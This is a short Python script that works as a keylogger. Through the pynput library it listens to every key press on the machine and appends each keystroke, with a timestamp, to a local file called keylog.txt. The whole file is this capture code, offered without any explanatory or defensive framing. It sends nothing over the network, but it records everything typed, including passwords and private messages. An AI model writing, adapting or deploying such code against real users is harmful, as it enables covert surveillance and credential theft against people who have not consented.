import pynput
from datetime import datetime

def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f"{datetime.now()} - {key}\n")

def main():
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()